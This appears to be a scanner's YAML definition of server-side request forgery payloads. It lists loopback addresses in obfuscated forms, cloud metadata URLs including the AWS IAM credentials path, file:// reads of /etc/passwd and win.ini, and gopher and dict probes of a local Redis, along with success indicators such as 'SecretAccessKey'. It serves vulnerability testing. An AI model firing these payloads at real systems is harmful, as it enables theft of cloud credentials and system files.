name: "Server-Side Request Forgery (SSRF)"
category: "ssrf"
severity: "high"
payloads:
  - value: "http://127.0.0.1"
    detection: "error_based"
  - value: "http://localhost"
    detection: "error_based"
  - value: "http://127.0.0.1:80"
    detection: "error_based"
  - value: "http://127.0.0.1:443"
    detection: "error_based"
  - value: "http://127.0.0.1:8080"
    detection: "error_based"
  - value: "http://127.0.0.1:8443"
    detection: "error_based"
  - value: "http://127.0.0.1:3306"
    detection: "error_based"
  - value: "http://[::1]"
    detection: "error_based"
  - value: "http://0x7f000001"
    detection: "error_based"
  - value: "http://0177.0.0.1"
    detection: "error_based"
  - value: "http://2130706433"
    detection: "error_based"
  - value: "http://169.254.169.254/latest/meta-data/"
    detection: "error_based"
  - value: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    detection: "error_based"
  - value: "http://metadata.google.internal/computeMetadata/v1/"
    detection: "error_based"
  - value: "http://169.254.169.254/metadata/v1/"
    detection: "error_based"
  - value: "file:///etc/passwd"
    detection: "error_based"
  - value: "file:///c:/windows/win.ini"
    detection: "error_based"
  - value: "dict://127.0.0.1:6379/INFO"
    detection: "error_based"
  - value: "gopher://127.0.0.1:6379/_INFO"
    detection: "error_based"

indicators:
  - "root:x:0"
  - "ami-id"
  - "instance-id"
  - "instance-type"
  - "security-credentials"
  - "iam/"
  - "AccessKeyId"
  - "SecretAccessKey"
  - "computeMetadata"
  - "for 16-bit app support"
  - "[extensions]"
  - "127.0.0.1"
  - "localhost"
  - "Connection refused"
  - "redis_version"
